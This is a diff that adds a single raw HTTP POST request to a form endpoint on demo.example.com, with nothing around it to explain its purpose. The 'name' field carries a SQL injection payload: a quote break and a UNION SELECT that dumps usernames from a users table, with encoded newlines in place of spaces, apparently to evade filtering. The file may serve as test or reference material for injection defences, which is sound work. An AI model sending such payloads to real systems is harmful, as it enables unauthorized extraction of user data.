@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Connection: close
+
+name=-1'%0aunion%0aselect%0a1,2,group_concat(username)%0afrom%0ausers--%0a-
